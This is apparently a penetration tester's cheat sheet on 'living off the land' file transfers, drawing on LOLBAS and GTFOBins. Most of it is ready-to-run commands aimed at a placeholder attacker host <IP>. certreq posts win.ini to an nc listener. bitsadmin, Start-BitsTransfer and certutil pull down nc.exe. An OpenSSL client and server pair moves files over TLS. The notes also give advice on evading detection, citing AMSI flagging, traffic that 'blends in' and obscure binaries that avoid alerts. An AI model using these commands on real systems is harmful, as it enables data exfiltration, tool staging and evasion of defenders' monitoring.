# Living off the Land — File Transfers

Use built-in / commonly installed binaries to avoid dropping tools.

- **Windows:** [LOLBAS](https://lolbas-project.github.io/) — search `/download` or `/upload`
- **Linux:** [GTFOBins](https://gtfobins.github.io/) — search `+file download` or `+file upload`

---

## Windows

### certreq.exe — Upload

```cmd
:: Upload a file via HTTP POST — catch with nc
certreq.exe -Post -config http://<IP>:8000/ C:\Windows\win.ini
```

```bash
# Attack host: catch with nc
sudo nc -lvnp 8000
```

> If `-Post` parameter is missing, the installed version is too old — download updated certreq.

---

### bitsadmin — Download

```cmd
bitsadmin /transfer wcb /priority foreground http://<IP>:8000/nc.exe C:\Users\Public\nc.exe
```

```powershell
# PowerShell BITS
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---

### certutil.exe — Download

```cmd
certutil.exe -verifyctl -split -f http://<IP>:8000/nc.exe
```

> ⚠️ Flagged by AMSI on modern Windows — use as last resort or in older environments.

---

## Linux

### OpenSSL — Download / Upload (nc-style, encrypted)

```bash
# Attack host: generate cert and serve file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/file.sh
```

```bash
# Target: download file
openssl s_client -connect <IP>:80 -quiet > file.sh
```

> Traffic is TLS-encrypted — blends in better than plain nc.

---

## Notes

- LOLBins vary by Windows version — check LOLBAS for version compatibility
- GTFOBins is also useful for privilege escalation (sudo, SUID, capabilities) — not just file transfers
- The more obscure the binary, the less likely it triggers alerts — worth knowing multiple options
